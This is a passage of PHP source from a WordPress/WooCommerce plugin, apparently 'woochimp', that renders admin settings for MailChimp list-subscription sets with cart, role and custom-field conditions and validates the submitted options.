                // WC31: Check if product categories are still WP post terms
                if ($post_cat->parent) {
                    $parent_id = $post_cat->parent;
                    $has_parent = true;

                    // Make sure we don't have an infinite loop here (happens with some kind of "ghost" categories)
                    $found = false;
                    $i = 0;

                    while ($has_parent && ($i < $post_categories_raw_count || $found)) {

                        // Reset each time
                        $found = false;
                        $i = 0;

                        foreach ($post_categories_raw as $parent_post_cat_key => $parent_post_cat) {

                            $i++;

                            if ($parent_post_cat->term_id == $parent_id) {
                                $category_name = $parent_post_cat->name . ' &rarr; ' . $category_name;
                                $found = true;

                                if ($parent_post_cat->parent) {
                                    $parent_id = $parent_post_cat->parent;
                                }
                                else {
                                    $has_parent = false;
                                }

                                break;
                            }
                        }
                    }
                }

                $post_categories[$post_cat->term_id] = $category_name;
            }

            /**
             * Load list of all roles
             */

            global $wp_roles;

            if (!isset($wp_roles)) {
                $wp_roles = new WP_Roles();
            }

            $role_names = $wp_roles->get_names();

            /**
             * Load list of all countries
             */

            /**
             * Available conditions
             */
            $condition_options = array(
                'always'          => __('No condition', 'woochimp'),
                'products'        => __('Products in cart', 'woochimp'),
                'variations'      => __('Product variations in cart', 'woochimp'),
                'categories'      => __('Product categories in cart', 'woochimp'),
                'amount'          => __('Order total', 'woochimp'),
                'custom'          => __('Custom field value', 'woochimp'),
                'roles'            => __('Customer roles', 'woochimp'),
            );

            /**
             * Load saved forms
             */
            if ($section['id'] == 'subscription_checkout_list_groups_auto') {
                $saved_sets = isset($this->opt['sets_auto']) ? $this->opt['sets_auto'] : '';
            }
            else if ($section['id'] == 'subscription_checkout_list_groups_checkbox') {
                $saved_sets = isset($this->opt['sets_checkbox']) ? $this->opt['sets_checkbox'] : '';
            }

            if (is_array($saved_sets) && !empty($saved_sets)) {

                // Pass selected properties to Javascript
                $woochimp_selected_lists = array();

                foreach ($saved_sets as $set_key => $set) {
                    $woochimp_selected_lists[$set_key] = array(
                        'list'      => $set['list'],
                        'groups'    => $set['groups'],
                        'merge'     => $set['fields']
                    );
                }
            }
            else {

                // Mockup
                $saved_sets = array(
                    1 => array(
                        'list'      => '',
                        'groups'    => array(),
                        'fields'    => array(),
                        'condition' => array(
                            'key'       => '',
                            'operator'  => '',
                            'value'     => '',
                        ),
                    ),
                );

                // Pass selected properties to Javascript
                $woochimp_selected_lists = array();
            }

            ?>
            <div class="woochimp-list-groups">
                <p><?php _e('Select mailing list and groups that customers will be added to. Multiple sets of list and groups with conditional selection are supported. If criteria of more than one set is matched, user will be subscribed multiple times to multiple lists.', 'woochimp'); ?></p>
                <div id="woochimp_list_groups_list">

                    <?php foreach ($saved_sets as $set_key => $set): ?>

                    <div id="woochimp_list_groups_list_<?php echo $set_key; ?>">
                        <h4 class="woochimp_list_groups_handle"><span class="woochimp_list_groups_title" id="woochimp_list_groups_title_<?php echo $set_key; ?>"><?php _e('Set #', 'woochimp'); ?><?php echo $set_key; ?></span><span class="woochimp_list_groups_remove" id="woochimp_list_groups_remove_<?php echo $set_key; ?>" title="<?php _e('Remove', 'woochimp'); ?>"><i class="fa fa-times"></i></span></h4>
                        <div style="clear:both;" class="woochimp_list_groups_content">

                            <div class="woochimp_list_groups_section">List & Groups</div>
                            <p id="woochimp_list_checkout_<?php echo $set_key; ?>" class="woochimp_loading_checkout woochimp_list_checkout">
                                <span class="woochimp_loading_icon"></span>
                                <?php _e('Connecting to MailChimp...', 'woochimp'); ?>
                            </p>

                            <div class="woochimp_list_groups_section">Fields</div>
                            <p id="woochimp_fields_table_<?php echo $set_key; ?>" class="woochimp_loading_checkout woochimp_fields_checkout">
                                <span class="woochimp_loading_icon"></span>
                                <?php _e('Connecting to MailChimp...', 'woochimp'); ?>
                            </p>

                            <div class="woochimp_list_groups_section">Conditions</div>
                            <table class="form-table"><tbody>
                                <tr valign="top">
                                    <th scope="row"><?php _e('Condition', 'woochimp'); ?></th>
                                    <td><select id="woochimp_sets_condition_<?php echo $set_key; ?>" name="woochimp_options[sets][<?php echo $set_key; ?>][condition]" class="woochimp-field set_condition_key">

                                        <?php
                                            foreach ($condition_options as $cond_value => $cond_title) {
                                                $is_selected = (is_array($set['condition']) && isset($set['condition']['key']) && $set['condition']['key'] == $cond_value) ? 'selected="selected"' : '';
                                                echo '<option value="' . $cond_value . '" ' . $is_selected . '>' . $cond_title . '</option>';
                                            }
                                        ?>

                                    </select></td>
                                </tr>
                                <tr valign="top">
                                    <th scope="row"><?php _e('Operator', 'woochimp'); ?></th>
                                    <td><select id="woochimp_sets_condition_operator_products_<?php echo $set_key; ?>" name="woochimp_options[sets][<?php echo $set_key; ?>][operator_products]" class="woochimp-field set_condition_operator set_condition_operator_products">
                                        <?php $is_selected = (is_array($set['condition']) && isset($set['condition']['key']) && $set['condition']['key'] == 'products') ? true : false; ?>
                                        <option value="contains" <?php echo (($is_selected && isset($set['condition']['value']) && $set['condition']['value']['operator'] == 'contains') ? 'selected="selected"' : ''); ?>><?php _e('Contains', 'woochimp'); ?></option>
                                        <option value="does_not_contain" <?php echo (($is_selected && isset($set['condition']['value']) && $set['condition']['value']['operator'] == 'does_not_contain') ? 'selected="selected"' : ''); ?>><?php _e('Does not contain', 'woochimp'); ?></option>
                                    </select></td>
                                </tr>
                                <tr valign="top">
                                    <th scope="row"><?php _e('Operator', 'woochimp'); ?></th>
                                    <td><select id="woochimp_sets_condition_operator_variations_<?php echo $set_key; ?>" name="woochimp_options[sets][<?php echo $set_key; ?>][operator_variations]" class="woochimp-field set_condition_operator set_condition_operator_variations">
                                        <?php $is_selected = (is_array($set['condition']) && isset($set['condition']['key']) && $set['condition']['key'] == 'variations') ? true : false; ?>
                                        <option value="contains" <?php echo (($is_selected && isset($set['condition']['value']) && $set['condition']['value']['operator'] == 'contains') ? 'selected="selected"' : ''); ?>><?php _e('Contains', 'woochimp'); ?></option>
                                        <option value="does_not_contain" <?php echo (($is_selected && isset($set['condition']['value']) && $set['condition']['value']['operator'] == 'does_not_contain') ? 'selected="selected"' : ''); ?>><?php _e('Does not contain', 'woochimp'); ?></option>
                                    </select></td>
                                </tr>
                                <tr valign="top">
                                    <th scope="row"><?php _e('Operator', 'woochimp'); ?></th>
                                    <td><select id="woochimp_sets_condition_operator_categories_<?php echo $set_key; ?>" name="woochimp_options[sets][<?php echo $set_key; ?>][operator_categories]" class="woochimp-field set_condition_operator set_condition_operator_categories">
                                        <?php $is_selected = (is_array($set['condition']) && isset($set['condition']['key']) && $set['condition']['key'] == 'categories') ? true : false; ?>
                                        <option value="contains" <?php echo (($is_selected && isset($set['condition']['value']) && $set['condition']['value']['operator'] == 'contains') ? 'selected="selected"' : ''); ?>><?php _e('Contains', 'woochimp'); ?></option>
                                        <option value="does_not_contain" <?php echo (($is_selected && isset($set['condition']['value']) && $set['condition']['value']['operator'] == 'does_not_contain') ? 'selected="selected"' : ''); ?>><?php _e('Does not contain', 'woochimp'); ?></option>
                                    </select></td>
                                </tr>
                                <tr valign="top">
                                    <th scope="row"><?php _e('Operator', 'woochimp'); ?></th>
                                    <td><select id="woochimp_sets_condition_operator_amount_<?php echo $set_key; ?>" name="woochimp_options[sets][<?php echo $set_key; ?>][operator_amount]" class="woochimp-field set_condition_operator set_condition_operator_amount">
                                        <?php $is_selected = (is_array($set['condition']) && isset($set['condition']['key']) && $set['condition']['key'] == 'amount') ? true : false; ?>
                                        <option value="lt" <?php echo (($is_selected && isset($set['condition']['value']) && $set['condition']['value']['operator'] == 'lt') ? 'selected="selected"' : ''); ?>><?php _e('Less than', 'woochimp'); ?></option>
                                        <option value="le" <?php echo (($is_selected && isset($set['condition']['value']) && $set['condition']['value']['operator'] == 'le') ? 'selected="selected"' : ''); ?>><?php _e('Less than or equal to', 'woochimp'); ?></option>
                                        <option value="eq" <?php echo (($is_selected && isset($set['condition']['value']) && $set['condition']['value']['operator'] == 'eq') ? 'selected="selected"' : ''); ?>><?php _e('Equal to', 'woochimp'); ?></option>
                                        <option value="ge" <?php echo (($is_selected && isset($set['condition']['value']) && $set['condition']['value']['operator'] == 'ge') ? 'selected="selected"' : ''); ?>><?php _e('Greater than or equal to', 'woochimp'); ?></option>
                                        <option value="gt" <?php echo (($is_selected && isset($set['condition']['value']) && $set['condition']['value']['operator'] == 'gt') ? 'selected="selected"' : ''); ?>><?php _e('Greater than', 'woochimp'); ?></option>
                                    </select></td>
                                </tr>
                                <tr valign="top">
                                    <th scope="row"><?php _e('Operator', 'woochimp'); ?></th>
                                    <td><select id="woochimp_sets_condition_operator_roles_<?php echo $set_key; ?>" name="woochimp_options[sets][<?php echo $set_key; ?>][operator_roles]" class="woochimp-field set_condition_operator set_condition_operator_roles">
                                        <?php $is_selected = (is_array($set['condition']) && isset($set['condition']['key']) && $set['condition']['key'] == 'roles') ? true : false; ?>
                                        <option value="is" <?php echo (($is_selected && isset($set['condition']['value']) && $set['condition']['value']['operator'] == 'is') ? 'selected="selected"' : ''); ?>><?php _e('Is', 'woochimp'); ?></option>
                                        <option value="is_not" <?php echo (($is_selected && isset($set['condition']['value']) && $set['condition']['value']['operator'] == 'is_not') ? 'selected="selected"' : ''); ?>><?php _e('Is not', 'woochimp'); ?></option>
                                    </select></td>
                                </tr>
                                <tr valign="top">
                                    <th scope="row"><?php _e('Products', 'woochimp'); ?></th>
                                    <td><select multiple id="woochimp_sets_condition_products_<?php echo $set_key; ?>" name="woochimp_options[sets][<?php echo $set_key; ?>][condition_products][]" class="woochimp-field set_condition_value set_condition_value_products">
                                        <?php
                                            // Load list of selected products
                                            if (is_array($set['condition']) && isset($set['condition']['key']) && $set['condition']['key'] == 'products' && isset($set['condition']['value']) && isset($set['condition']['value']['value']) && is_array($set['condition']['value']['value'])) {
                                                foreach ($set['condition']['value']['value'] as $key => $id) {
                                                    $name = get_the_title($id);
                                                    echo '<option value="' . $id . '" selected="selected">' . $name . '</option>';
                                                }
                                            }
                                        ?>
                                    </select></td>
                                </tr>
                                <tr valign="top">
                                    <th scope="row"><?php _e('Variations', 'woochimp'); ?></th>
                                    <td><select multiple id="woochimp_sets_condition_variations_<?php echo $set_key; ?>" name="woochimp_options[sets][<?php echo $set_key; ?>][condition_variations][]" class="woochimp-field set_condition_value set_condition_value_variations">
                                        <?php
                                            // Load list of selected products
                                            if (is_array($set['condition']) && isset($set['condition']['key']) && $set['condition']['key'] == 'variations' && isset($set['condition']['value']) && isset($set['condition']['value']['value']) && is_array($set['condition']['value']['value'])) {
                                                foreach ($set['condition']['value']['value'] as $key => $id) {
                                                    $name = $this->get_formatted_product_variation_title($id);
                                                    echo '<option value="' . $id . '" selected="selected">' . $name . '</option>';
                                                }
                                            }
                                        ?>
                                    </select></td>
                                </tr>
                                <tr valign="top">
                                    <th scope="row"><?php _e('Product categories', 'woochimp'); ?></th>
                                    <td><select multiple id="woochimp_sets_condition_categories_<?php echo $set_key; ?>" name="woochimp_options[sets][<?php echo $set_key; ?>][condition_categories][]" class="woochimp-field set_condition_value set_condition_value_categories">

                                        <?php
                                            foreach ($post_categories as $key => $name) {
                                                $is_selected = (is_array($set['condition']) && isset($set['condition']['key']) && $set['condition']['key'] == 'categories' && isset($set['condition']['value']) && isset($set['condition']['value']['value']) && in_array($key, $set['condition']['value']['value'])) ? 'selected="selected"' : '';
                                                echo '<option value="' . $key . '" ' . $is_selected . '>' . $name . '</option>';
                                            }
                                        ?>

                                    </select></td>
                                </tr>
                                <tr valign="top">
                                    <th scope="row"><?php _e('Order total', 'woochimp'); ?></th>
                                    <td><input type="text" id="woochimp_sets_condition_amount_<?php echo $set_key; ?>" name="woochimp_options[sets][<?php echo $set_key; ?>][condition_amount]" value="<?php echo ((is_array($set['condition']) && $set['condition']['key'] == 'amount' && isset($set['condition']['value']) && isset($set['condition']['value']['value'])) ? $set['condition']['value']['value'] : ''); ?>" class="woochimp-field set_condition_value set_condition_value_amount"></td>
                                </tr>
                                <tr valign="top">
                                    <th scope="row"><?php _e('Custom field key', 'woochimp'); ?></th>
                                    <td><input type="text" id="woochimp_sets_condition_key_custom_<?php echo $set_key; ?>" name="woochimp_options[sets][<?php echo $set_key; ?>][condition_key_custom]" value="<?php echo ((is_array($set['condition']) && $set['condition']['key'] == 'custom' && isset($set['condition']['value']) && isset($set['condition']['value']['key'])) ? $set['condition']['value']['key'] : ''); ?>" class="woochimp-field set_condition_custom_key set_condition_custom_key_custom"></td>
                                </tr>
                                <tr valign="top">
                                    <th scope="row"><?php _e('Operator', 'woochimp'); ?></th>
                                    <td><select id="woochimp_sets_condition_operator_custom_<?php echo $set_key; ?>" name="woochimp_options[sets][<?php echo $set_key; ?>][operator_custom]" class="woochimp-field set_condition_operator set_condition_operator_custom">
                                        <?php $is_selected = (is_array($set['condition']) && isset($set['condition']['key']) && $set['condition']['key'] == 'custom') ? true : false; ?>
                                        <optgroup label="String">
                                            <option value="is" <?php echo (($is_selected && isset($set['condition']['value']) && isset($set['condition']['value']['operator']) && $set['condition']['value']['operator'] == 'is') ? 'selected="selected"' : ''); ?>><?php _e('Is', 'woochimp'); ?></option>
                                            <option value="is_not" <?php echo (($is_selected && isset($set['condition']['value']) && isset($set['condition']['value']['operator']) && $set['condition']['value']['operator'] == 'is_not') ? 'selected="selected"' : ''); ?>><?php _e('Is not', 'woochimp'); ?></option>
                                            <option value="contains" <?php echo (($is_selected && isset($set['condition']['value']) && isset($set['condition']['value']['operator']) && $set['condition']['value']['operator'] == 'contains') ? 'selected="selected"' : ''); ?>><?php _e('Contains', 'woochimp'); ?></option>
                                            <option value="does_not_contain" <?php echo (($is_selected && isset($set['condition']['value']) && isset($set['condition']['value']['operator']) && $set['condition']['value']['operator'] == 'does_not_contain') ? 'selected="selected"' : ''); ?>><?php _e('Does not contain', 'woochimp'); ?></option>
                                        </optgroup>
                                        <optgroup label="Number">
                                            <option value="lt" <?php echo (($is_selected && isset($set['condition']['value']) && isset($set['condition']['value']['operator']) && $set['condition']['value']['operator'] == 'lt') ? 'selected="selected"' : ''); ?>><?php _e('Less than', 'woochimp'); ?></option>
                                            <option value="le" <?php echo (($is_selected && isset($set['condition']['value']) && isset($set['condition']['value']['operator']) && $set['condition']['value']['operator'] == 'le') ? 'selected="selected"' : ''); ?>><?php _e('Less than or equal to', 'woochimp'); ?></option>
                                            <option value="eq" <?php echo (($is_selected && isset($set['condition']['value']) && isset($set['condition']['value']['operator']) && $set['condition']['value']['operator'] == 'eq') ? 'selected="selected"' : ''); ?>><?php _e('Equal to', 'woochimp'); ?></option>
                                            <option value="ge" <?php echo (($is_selected && isset($set['condition']['value']) && isset($set['condition']['value']['operator']) && $set['condition']['value']['operator'] == 'ge') ? 'selected="selected"' : ''); ?>><?php _e('Greater than or equal to', 'woochimp'); ?></option>
                                            <option value="gt" <?php echo (($is_selected && isset($set['condition']['value']) && isset($set['condition']['value']['operator']) && $set['condition']['value']['operator'] == 'gt') ? 'selected="selected"' : ''); ?>><?php _e('Greater than', 'woochimp'); ?></option>
                                        </optgroup>
                                    </select></td>
                                </tr>
                                <tr valign="top">
                                    <th scope="row"><?php _e('Custom field value', 'woochimp'); ?></th>
                                    <td><input type="text" id="woochimp_sets_condition_custom_value_<?php echo $set_key; ?>" name="woochimp_options[sets][<?php echo $set_key; ?>][condition_custom_value]" value="<?php echo ((is_array($set['condition']) && $set['condition']['key'] == 'custom' && isset($set['condition']['value']) && isset($set['condition']['value']['value'])) ? $set['condition']['value']['value'] : ''); ?>" class="woochimp-field set_condition_value set_condition_value_custom"></td>
                                </tr>
                                <tr valign="top">
                                    <th scope="row"><?php _e('Customer roles', 'woochimp'); ?></th>
                                    <td><select multiple id="woochimp_sets_condition_roles_<?php echo $set_key; ?>" name="woochimp_options[sets][<?php echo $set_key; ?>][condition_roles][]" class="woochimp-field set_condition_value set_condition_value_roles">

                                        <?php
                                            foreach ($role_names as $key => $name) {
                                                $is_selected = (is_array($set['condition']) && isset($set['condition']['key']) && $set['condition']['key'] == 'roles' && isset($set['condition']['value']) && isset($set['condition']['value']['value']) && in_array($key, $set['condition']['value']['value'])) ? 'selected="selected"' : '';
                                                echo '<option value="' . $key . '" ' . $is_selected . '>' . $name . '</option>';
                                            }
                                        ?>

                                    </select></td>
                                </tr>
                            </tbody></table>

                        </div>
                        <div style="clear: both;"></div>
                    </div>

                    <?php endforeach; ?>

                </div>
                <div>
                    <button type="button" name="woochimp_add_set" id="woochimp_add_set" disabled="disabled" class="button" value="<?php _e('Add Set', 'woochimp'); ?>" title="<?php _e('Still connecting to MailChimp...', 'woochimp'); ?>"><i class="fa fa-plus">&nbsp;&nbsp;<?php _e('Add Set', 'woochimp'); ?></i></button>
                    <div style="clear: both;"></div>
                </div>
            </div>
            <?php
        }
    }

    /*
     * Render a text field
     *
     * @access public
     * @param array $args
     * @return void
     */
    public function render_options_text($args = array())
    {
        printf(
            '<input type="text" id="%s" name="woochimp_options[%s]" value="%s" class="woochimp-field" />',
            $args['name'],
            $args['name'],
            $args['options'][$args['name']]
        );
    }

    /*
     * Render a text area
     *
     * @access public
     * @param array $args
     * @return void
     */
    public function render_options_textarea($args = array())
    {
        printf(
            '<textarea id="%s" name="woochimp_options[%s]" class="woochimp-textarea">%s</textarea>',
            $args['name'],
            $args['name'],
            $args['options'][$args['name']]
        );
    }

    /*
     * Render a checkbox
     *
     * @access public
     * @param array $args
     * @return void
     */
    public function render_options_checkbox($args = array())
    {
        printf(
            '<input type="checkbox" id="%s" name="%soptions[%s]" value="1" %s />',
            $args['name'],
            'woochimp_',
            $args['name'],
            checked($args['options'][$args['name']], true, false)
        );
    }

    /*
     * Render a dropdown
     *
     * @access public
     * @param array $args
     * @return void
     */
    public function render_options_dropdown($args = array())
    {
        // Handle MailChimp lists dropdown differently
        if (in_array($args['name'], array('woochimp_list_checkout', 'woochimp_list_widget', 'woochimp_list_shortcode', 'woochimp_list_store'))) {
            echo '<p id="' . $args['name'] . '" class="woochimp_loading"><span class="woochimp_loading_icon"></span>' . __('Connecting to MailChimp...', 'woochimp') . '</p>';
        }
        // Handle MailChimp groups multiselect differently
        else if (in_array($args['name'], array('woochimp_groups_checkout', 'woochimp_groups_widget', 'woochimp_groups_shortcode'))) {
            echo '<p id="' . $args['name'] . '" class="woochimp_loading"><span class="woochimp_loading_icon"></span>' . __('Connecting to MailChimp...', 'woochimp') . '</p>';
        }
        else {

            printf(
                '<select id="%s" name="woochimp_options[%s]" class="woochimp-field">',
                $args['name'],
                $args['name']
            );

            foreach ($this->options[$args['name']] as $key => $name) {
                printf(
                    '<option value="%s" %s %s>%s</option>',
                    $key,
                    selected($key, $args['options'][$args['name']], false),
                    ($key === 0 ? 'disabled="disabled"' : ''),
                    $name
                );
            }
            echo '</select>';
        }
    }

    /*
     * Render a dropdown with optgroups
     *
     * @access public
     * @param array $args
     * @return void
     */
    public function render_options_dropdown_optgroup($args = array())
    {
        printf(
            '<select id="%s" name="woochimp_options[%s]" class="woochimp-field">',
            $args['name'],
            $args['name']
        );

        foreach ($this->options[$args['name']] as $optgroup) {

            printf(
                '<optgroup label="%s">',
                $optgroup['title']
            );

            foreach ($optgroup['children'] as $value => $title) {

                printf(
                    '<option value="%s" %s %s>%s</option>',
                    $value,
                    selected($value, $args['options'][$args['name']], false),
                    ($value === 0 ? 'disabled="disabled"' : ''),
                    $title
                );
            }

            echo '</optgroup>';
        }

        echo '</select>';
    }

    /*
     * Render a password field
     *
     * @access public
     * @param array $args
     * @return void
     */
    public function render_options_password($args = array())
    {
        printf(
            '<input type="password" id="%s" name="woochimp_options[%s]" value="%s" class="woochimp-field" />',
            $args['name'],
            $args['name'],
            $args['options'][$args['name']]
        );
    }

    /**
     * Validate admin form input
     *
     * @access public
     * @param array $input
     * @return array
     */
    public function options_validate($input)
    {
        $current_tab = isset($_POST['current_tab']) ? $_POST['current_tab'] : 'general-settings';
        $output = $original = $this->get_options();

        $revert = array();
        $errors = array();

        // Handle checkout tabs differently
        if (in_array($current_tab, array('checkout-auto', 'checkout-checkbox'))) {

            if ($current_tab == 'checkout-checkbox') {

                // Subscribe on
                $output['woochimp_checkout_checkbox_subscribe_on'] = (isset($input['woochimp_checkout_checkbox_subscribe_on']) && in_array($input['woochimp_checkout_checkbox_subscribe_on'], array('1', '2', '3', '4'))) ? $input['woochimp_checkout_checkbox_subscribe_on'] : '1';

                // Label
                $output['woochimp_text_checkout'] = (isset($input['woochimp_text_checkout']) && !empty($input['woochimp_text_checkout'])) ? $input['woochimp_text_checkout'] : '';

                // Checkbox position
                $output['woochimp_checkbox_position'] = (in_array($input['woochimp_checkbox_position'], array('woocommerce_checkout_before_customer_details', 'woocommerce_checkout_after_customer_details', 'woocommerce_checkout_billing', 'woocommerce_checkout_shipping', 'woocommerce_checkout_order_review', 'woocommerce_review_order_after_submit', 'woocommerce_review_order_before_submit', 'woocommerce_review_order_before_order_total', 'woocommerce_after_checkout_billing_form'))) ? $input['woochimp_checkbox_position'] : 'woocommerce_checkout_after_customer_details';

                // Default state
                $output['woochimp_default_state'] = (isset($input['woochimp_default_state']) && $input['woochimp_default_state'] == '1') ? '1' : '2';

                // Method how to add to groups
                $output['woochimp_checkout_groups_method'] = (in_array($input['woochimp_checkout_groups_method'], array('auto','multi','single','select','single_req','select_req'))) ? $input['woochimp_checkout_groups_method'] : 'auto';

                // Hide checkbox for subscribed
                $output['woochimp_hide_checkbox'] = (in_array($input['woochimp_hide_checkbox'], array('1','2','3'))) ? $input['woochimp_hide_checkbox'] : '1';

                // Double opt-in
                $output['woochimp_double_checkout_checkbox'] = (isset($input['woochimp_double_checkout_checkbox']) && $input['woochimp_double_checkout_checkbox'] == '1') ? '1' : '0';

                // Sets
                $sets_key = 'sets_checkbox';
                $input_sets = isset($input[$sets_key]) ? $input[$sets_key] : $input['sets'];
            }

            else if ($current_tab == 'checkout-auto') {

                // Subscribe on
                $output['woochimp_checkout_auto_subscribe_on'] = (isset($input['woochimp_checkout_auto_subscribe_on']) && in_array($input['woochimp_checkout_auto_subscribe_on'], array('1', '2', '3', '4'))) ? $input['woochimp_checkout_auto_subscribe_on'] : '1';

                // Do not resubscribe unsubscribed
                $output['woochimp_do_not_resubscribe_auto'] = (isset($input['woochimp_do_not_resubscribe_auto']) && $input['woochimp_do_not_resubscribe_auto'] == '1') ? '1' : '0';

                // Double opt-in
                $output['woochimp_double_checkout_auto'] = (isset($input['woochimp_double_checkout_auto']) && $input['woochimp_double_checkout_auto'] == '1') ? '1' : '0';

                // Sets
                $sets_key = 'sets_auto';
                $input_sets = isset($input[$sets_key]) ? $input[$sets_key] : $input['sets'];
            }

            $new_sets = array();

            if (isset($input_sets) && !empty($input_sets)) {

                $set_number = 0;

                foreach ($input_sets as $set) {

                    $set_number++;

                    $new_sets[$set_number] = array();

                    // List
                    $new_sets[$set_number]['list'] = (isset($set['list']) && !empty($set['list'])) ? $set['list']: '';

                    // Groups
                    $new_sets[$set_number]['groups'] = array();

                    if (isset($set['groups']) && is_array($set['groups'])) {
                        foreach ($set['groups'] as $group) {
                            $new_sets[$set_number]['groups'][] = $group;
                        }
                    }

                    // Fields
                    $new_sets[$set_number]['fields'] = array();

                    if (isset($set['field_names']) && is_array($set['field_names'])) {

                        $field_number = 0;

                        foreach ($set['field_names'] as $field) {

                            if (!is_array($field) || !isset($field['name']) || !isset($field['tag']) || empty($field['name']) || empty($field['tag'])) {
                                continue;
                            }

                            $field_number++;

                            $new_sets[$set_number]['fields'][$field_number] = array(
                                'name'  => $field['name'],
                                'tag'   => $field['tag']
                            );

                            // Add value for custom fields
                            if (!empty($field['value'])) {
                                $new_sets[$set_number]['fields'][$field_number]['value'] = $field['value'];
                            }
                        }
                    }

                    // Condition
                    $new_sets[$set_number]['condition'] = array();
                    $new_sets[$set_number]['condition']['key'] = (isset($set['condition']) && !empty($set['condition'])) ? $set['condition']: 'always';

                    // Condition value
                    if ($new_sets[$set_number]['condition']['key'] == 'products') {
                        if (isset($set['operator_products']) && !empty($set['operator_products']) && isset($set['condition_products']) && is_array($set['condition_products']) && !empty($set['condition_products'])) {

                            // Operator
                            $new_sets[$set_number]['condition']['value']['operator'] = $set['operator_products'];

                            // Value
                            foreach ($set['condition_products'] as $condition_item) {
                                if (empty($condition_item)) {
                                    continue;
                                }

                                $new_sets[$set_number]['condition']['value']['value'][] = $condition_item;
                            }
                        }
                        else {
                            $new_sets[$set_number]['condition']['key'] = 'always';
                            $new_sets[$set_number]['condition']['value'] = array();
                        }
                    }
                    else if ($new_sets[$set_number]['condition']['key'] == 'variations') {
                        if (isset($set['operator_variations']) && !empty($set['operator_variations']) && isset($set['condition_variations']) && is_array($set['condition_variations']) && !empty($set['condition_variations'])) {

                            // Operator
                            $new_sets[$set_number]['condition']['value']['operator'] = $set['operator_variations'];

                            // Value
                            foreach ($set['condition_variations'] as $condition_item) {
                                if (empty($condition_item)) {
                                    continue;
                                }

                                $new_sets[$set_number]['condition']['value']['value'][] = $condition_item;
                            }
                        }
                        else {
                            $new_sets[$set_number]['condition']['key'] = 'always';
                            $new_sets[$set_number]['condition']['value'] = array();
                        }
                    }
                    else if ($new_sets[$set_number]['condition']['key'] == 'categories') {
                        if (isset($set['operator_categories']) && !empty($set['operator_categories']) && isset($set['condition_categories']) && is_array($set['condition_categories']) && !empty($set['condition_categories'])) {

                            // Operator
                            $new_sets[$set_number]['condition']['value']['operator'] = $set['operator_categories'];

                            // Value
                            foreach ($set['condition_categories'] as $condition_item) {
                                if (empty($condition_item)) {
                                    continue;
                                }

                                $new_sets[$set_number]['condition']['value']['value'][] = $condition_item;
                            }
                        }
                        else {
                            $new_sets[$set_number]['condition']['key'] = 'always';
                            $new_sets[$set_number]['condition']['value'] = array();
                        }
                    }
                    else if ($new_sets[$set_number]['condition']['key'] == 'amount') {
                        if (isset($set['operator_amount']) && !empty($set['operator_amount']) && isset($set['condition_amount']) && !empty($set['condition_amount'])) {

                            // Operator
                            $new_sets[$set_number]['condition']['value']['operator'] = $set['operator_amount'];

                            // Value
                            $new_sets[$set_number]['condition']['value']['value'] = $set['condition_amount'];
                        }
                        else {
                            $new_sets[$set_number]['condition']['key'] = 'always';
                            $new_sets[$set_number]['condition']['value'] = array();
                        }
                    }
                    else if ($new_sets[$set_number]['condition']['key'] == 'custom') {
                        if (isset($set['condition_key_custom']) && !empty($set['condition_key_custom']) && isset($set['operator_custom']) && !empty($set['operator_custom']) && isset($set['condition_custom_value']) && !empty($set['condition_custom_value'])) {

                            // Field key
                            $new_sets[$set_number]['condition']['value']['key'] = $set['condition_key_custom'];

                            // Operator
                            $new_sets[$set_number]['condition']['value']['operator'] = $set['operator_custom'];

                            // Value
                            $new_sets[$set_number]['condition']['value']['value'] = $set['condition_custom_value'];
                        }
                        else {
                            $new_sets[$set_number]['condition']['key'] = 'always';
                            $new_sets[$set_number]['condition']['value'] = array();
                        }
                    }
                    else if ($new_sets[$set_number]['condition']['key'] == 'roles') {
                        if (isset($set['operator_roles']) && !empty($set['operator_roles']) && isset($set['condition_roles']) && is_array($set['condition_roles']) && !empty($set['condition_roles'])) {

                            // Operator
                            $new_sets[$set_number]['condition']['value']['operator'] = $set['operator_roles'];

                            // Value
                            foreach ($set['condition_roles'] as $condition_item) {
                                if (empty($condition_item)) {
                                    continue;
                                }

                                $new_sets[$set_number]['condition']['value']['value'][] = $condition_item;
                            }
                        }
                        else {
                            $new_sets[$set_number]['condition']['key'] = 'always';
                            $new_sets[$set_number]['condition']['value'] = array();
                        }
                    }
                    else {
                        $new_sets[$set_number]['condition']['value'] = array();
                    }

                }

            }

            $output[$sets_key] = $new_sets;
        }

        // Handle all other settings as usual
        else {

            // Handle field names (if any)
            if (isset($input['field_names'])) {

                $new_field_names = array();
                $fields_page = null;

                if (is_array($input['field_names']) && !empty($input['field_names'])) {
                    foreach ($input['field_names'] as $key => $page) {

                        $fields_page = $key;

                        if (is_array($page) && !empty($page)) {

                            $merge_field_key = 1;

                            foreach ($page as $merge_field) {
                                if (isset($merge_field['name']) && !empty($merge_field['name']) && isset($merge_field['tag']) && !empty($merge_field['tag'])) {

                                    $new_field_names[$merge_field_key] = array(
                                        'name' => $merge_field['name'],
                                        'tag' => $merge_field['tag'],
                                    );

                                    $merge_field_key++;
                                }
                            }
                        }

                    }
                }

                if (!empty($page)) {
                    $output['woochimp_'.$fields_page.'_fields'] = $new_field_names;
                }
            }

            // Iterate over fields and validate/sanitize input
            foreach ($this->validation[$current_tab] as $field => $rule) {

                $allow_empty = true;

                // Conditional validation
                if (is_array($rule['empty']) && !empty($rule['empty'])) {
                    if (isset($input['woochimp_' . $rule['empty'][0]]) && ($input['woochimp_' . $rule['empty'][0]] != '0')) {
                        $allow_empty = false;
                    }
                }
                else if ($rule['empty'] == false) {
                    $allow_empty = false;
                }

                // Different routines for different field types
                switch($rule['rule']) {

                    // Validate numbers
                    case 'number':
                        if (is_numeric($input[$field]) || ($input[$field] == '' && $allow_empty)) {
                            $output[$field] = $input[$field];
                        }
                        else {
                            if (is_array($rule['empty']) && !empty($rule['empty'])) {
                                $revert[$rule['empty'][0]] = '0';
                            }
                            array_push($errors, array('setting' => $field, 'code' => 'number'));
                        }
                        break;

                    // Validate boolean values (actually 1 and 0)
                    case 'bool':
                        $input[$field] = (isset($input[$field]) && $input[$field] != '') ? $input[$field] : '0';
                        if (in_array($input[$field], array('0', '1')) || ($input[$field] == '' && $allow_empty)) {
                            $output[$field] = $input[$field];
                        }
                        else {
                            if (is_array($rule['empty']) && !empty($rule['empty'])) {
                                $revert[$rule['empty'][0]] = '0';
                            }
                            array_push($errors, array('setting' => $field, 'code' => 'bool'));
                        }
                        break;

                    // Validate predefined options
                    case 'option':

                        // Check if this call is for mailing lists
                        if ($field == 'woochimp_list_checkout') {
                            //$this->options[$field] = $this->get_lists();
